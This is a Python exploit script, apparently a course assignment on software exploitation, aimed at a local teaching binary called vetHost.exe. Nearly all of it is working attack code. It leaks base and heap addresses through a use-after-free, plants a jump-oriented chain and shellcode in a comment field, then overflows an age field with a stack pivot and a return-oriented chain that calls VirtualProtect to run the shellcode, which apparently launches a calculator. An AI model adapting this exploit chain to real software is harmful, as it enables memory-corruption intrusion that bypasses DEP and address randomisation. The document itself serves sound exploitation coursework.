#! c:\Python37\python.exe

# 03/16/2022
# CSC-848 Advanced Software Exploitation
# Micah Flack

from email.mime import base
import struct
import os
import sys
import socket
from subprocess import call


'''
vetHost.exe config settings
'''

offset = 14480          # offset from disclosure to base: 0x3890
address = "127.0.0.1"   # vetHost address
port = 8888             # vetHost port


# def create_shellcode():
#     bin = "micah"
#     shellcode = b""

#     cmd = '"C:\\Program Files\\NASM\\nasm.exe" "'+os.getcwd()+'\\micah.asm"'
#     status = call(cmd, shell=True)

#     with open(bin, 'rb') as f:
#         shellcode = f.read()

#     return shellcode

shellcode =  b""
shellcode +=  b"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
shellcode +=  b"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
shellcode +=  b"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
shellcode +=  b"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
shellcode +=  b"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
shellcode +=  b"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
shellcode +=  b"\x45\x81\x3e\x43\x72\x65\x61\x75"
shellcode +=  b"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
shellcode +=  b"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
shellcode +=  b"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
shellcode +=  b"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
shellcode +=  b"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
shellcode +=  b"\x6c\x63\x89\xe2\x52\x52\x53\x53"
shellcode +=  b"\x53\x53\x53\x53\x52\x53\xff\xd7"


def create_rop_chain(baseaddress, heapaddress):
	rop_gadgets = [
		0x11011a32,  # (base + 0x11a32), # pop esi # ret  # vetHost.exe   Load ESI with address for dispatcher gadget!
		0x110150e2,  # (base + 0x2746), # add ebx, 0x10 # jmp dword ptr [ebx] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11017542,  # (RVA : 0x00017542) : # POP EBX # RETN  # vetHost.exe Load EAX with address of dispatch table
		heapaddress - 32, # Address for your dispatcher table!
        0x110121b2,  # JMP DWORD PTR [EBX] to dispatcher gadget; start the JOP!
	]
	return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

'''
generate JOP chain to call VirtualProtect()
'''

def create_jop_chain(baseaddress, heapaddress):
	jop_gadgets = [
		0x1100318b, # (base + 0x318b), # add esp, 0x24 # xor eax, eax # pop edi # jmp esi # vetHost.exe  [0x28 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242,	0x43434343, # padding  (0x10 bytes)
		0x1100318b, # (base + 0x318b), # add esp, 0x24 # xor eax, eax # pop edi # jmp esi # vetHost.exe  [0x28 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242,	0x43434343, # padding  (0x10 bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes] 0x64
		0x42424242, 0x42424242, 0x42424242,	0x43434343, # padding  (0x10 bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes] 0x78 **^ 
		0x42424242, 0x42424242, 0x42424242,	0x43434343, # padding  (0x10 bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242,	0x43434343, # padding  (0x10 bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
	]
	return b''.join(struct.pack('<I', _) for _ in jop_gadgets)    

'''
these are the commands used as if we were accessing the
terminal manually via vetClient.exe
'''

base_cmds = [
    b"A\n",  # animal menu
    b"OK\n",
    b"D\n",  # delete animal
    b"0\n",  # animal @ index [0]
    b"OK\n",
    b"Y\n",  # confirm deletion
    b"OK\n",
    b"X\n",  # return to main menu
    b"OK\n",
    b"Q\n",  # quick add/delete
    b"OK\n",
    b"1\n",  # add 1 animals
    b"1\n",  # add 1 clinics
    b"OK\n",
    b"-1\n", # skip delete animals
    b"OK\n",
    b"-1\n", # skip delete clinics
    b"OK\n",
    b"\n",   # enter to return to menu
    b"OK\n",
]


'''
commands used to access the animal records and access 'Age' buffer overflow
'''

overflow_cmds = [
    b"A\n",     # animal menu
    b"OK\n",
    b"E\n",     # edit animal
    b"1\n",     # animal index @ [1]
    b"OK\n",
    b"4\n",     # edit animal age
    b"",        # add payload here
]


def send_cmds(cmds):

    '''
    here we just iterate through the commands and issue each via the socket
    [1] send cmd
    [2] recv response from vetHost
    [3] check if ready for disclosure grab
    '''

    base_addr = ""
    heap_addr = ""

    for cmd in range(0,len(cmds)):
        socket.sendall(cmds[cmd])                           # send command
        data = socket.recv(1024)
        if (b"ANIMALS" in data and b"CLINICS" in data):
            base_addr = int(float(data.split()[9]))         # grab memory disclosure from age field
            heap_addr = int(float(data.split()[13]))
        
        print("\tCommand [{0}]\t{1}\t -- Successful!".format(cmd, cmds[cmd]))

    return base_addr, heap_addr if base_addr else 0          # return decimal disclosure address


def get_baseaddress():

    '''
    the address recovered from the memory disclosure is in decimal format,
    however, offset math needs to be done in decimal then converted back
    to hexadecimal representation
    '''

    disclosed_base, disclosed_heap = send_cmds(base_cmds)

    hex_disclosed_base = hex(disclosed_base)
    hex_disclosed_heap = hex(disclosed_heap - 1116)
    disclosed_heap = int(hex_disclosed_heap, base=16)

    int_base = disclosed_base - offset
    hex_base = hex(int_base)

    print("\n")
    print("\tDisclosed base address: \t decimal: {0} \t hex: {1}".format(disclosed_base, hex_disclosed_base))
    print("\tDisclosed heap address: \t decimal: {0} \t hex: {1}".format(disclosed_heap, hex_disclosed_heap))
    print("\tBase address \t\t\t decimal: {0} \t hex: {1}".format(int_base, hex_base))
    print("\tOffset \t\t\t\t decimal: {0} \t hex: {1}".format(offset, hex(offset)))
    print("\n")
    
    return int_base, disclosed_heap

def create_comment(baseaddress, heapaddress):

    jop_chain = create_jop_chain(baseaddress, heapaddress)

    '''
    creates the jop chain accessed by overflow cmds via
    the clinic[0] comment field
    '''
    jop_comments = [
        b"c\n",
        b"OK\n",
        b"e\n",
        b"0\n",
        b"OK\n",
        b"5\n",
        jop_chain + b"\x90" * 4 + shellcode,
        b"OK\n",
        b"0\n",
        b"OK\n",
        b"x\n",
        b"OK\n"
    ]

    send_cmds(jop_comments)

    return jop_chain


def overflow(baseaddress, heapaddress, jop_chain):

    print("[*] Generating shellcode...")
    # shellcode = create_shellcode()

    rop_chain = create_rop_chain(baseaddress, heapaddress)

    # jop_start = struct.pack('<L', baseaddress + 10063 ) # 0x274f pop ecx, pop ebx, jmp ecx
    # jop_start += struct.pack('<L', baseaddress + 86242 ) # 0x150e2 add ebx, 0x10; jmp dword ptr [ebx]
    # jop_start += struct.pack('<L', heapaddress) # location of JOP gadgets and shellcode

    vp_stack = struct.pack('<L', baseaddress + 98352 ) # 0x11001830 # ptr -> VirtualProtect()
    vp_stack += struct.pack('<L', heapaddress + len(jop_chain) ) # return address  <-- where you want it to return
    vp_stack += struct.pack('<L', heapaddress + len(jop_chain) ) # lpAddress  <-- Where you want to start modifying proctection
    vp_stack += struct.pack('<L', 0x201 ) # dwsize  <-- Size: 1000
    vp_stack += struct.pack('<L', 0x40 ) # flNewProtect <-- RWX
    vp_stack += struct.pack('<L', baseaddress + 130015 ) # lpflOldProtect <--  MUST be writable location

    nops = b'\x90' * 409
    padding = b'\x90'*5 + b'\x41'*304

    stackpivot = struct.pack('<I', baseaddress + 10374 )

    payload = padding + stackpivot + b'\x90'*24 + rop_chain + vp_stack + nops	

    print("[*] Executing age buffer overflow...\n")
    overflow_cmds[-1] = payload
    send_cmds(overflow_cmds)

    socket.sendall(b"OK\n")
    socket.sendall(b"OK\n")

    print("\n[*] Overflow executed successfully!")

    return


'''
initialize connection from "vetClient" to vetHost; obtain socket
'''

socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
socket.connect((address, 8888))
print("[*] Connection to vetHost successful")
data = socket.recv(40)
socket.sendall(b"OK\n")
data = socket.recv(500) # main menu
print("[*] Receiving menu...")

'''
obtain base addr via UAF vulnerability at the address... 0x11003C10
offset returned should be @ 0x3890 from 0x11000000
'''

print("[*] Obtaining base address...\n")
baseaddress, heapaddress = get_baseaddress()

print("[*] Creating JOP_Chain comment under clinic[0]...\n")
jop_chain = create_comment(baseaddress, heapaddress)

print("[*] Building overflow...")
overflow(baseaddress, heapaddress, jop_chain)

print("[*] Exploit completed.")

socket.close()